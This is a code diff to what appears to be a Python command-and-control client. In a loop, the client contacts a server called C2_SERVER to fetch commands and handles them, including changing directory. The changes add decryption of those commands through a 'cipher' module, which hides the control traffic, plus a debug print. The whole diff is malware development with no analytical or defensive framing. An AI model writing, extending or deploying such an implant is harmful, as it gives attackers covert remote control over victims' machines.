@@ -7,6 +7,7 @@ from os import chdir, getenv, uname, getcwd
 import platform, socket, time
 from subprocess import PIPE, STDOUT, run
 from requests import exceptions, get, post
+from crypt import cipher
 from settings import PORT, C2_SERVER, CMD_REQUEST, RESPONSE_PATH, CWD_RESPONSE, RESPONSE_KEY, HEADER, PROXY, HTTPStatusCode
 
 
@@ -30,6 +31,7 @@ else:
 while True:
     try:
         response = get(f'http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}', headers=HEADER, proxies=PROXY)
+        print(response)
         if response.status_code == HTTPStatusCode.NOT_FOUND.value:
             raise exceptions.RequestException
     except exceptions.RequestException as e:
@@ -37,7 +39,8 @@ while True:
         time.sleep(3)
         continue
 
-    cmd = response.content.decode()
+    cmd = cipher.decrypt(response.content).decode()
+
     if cmd.startswith("cd "):
         dir = cmd[3:]
         try:
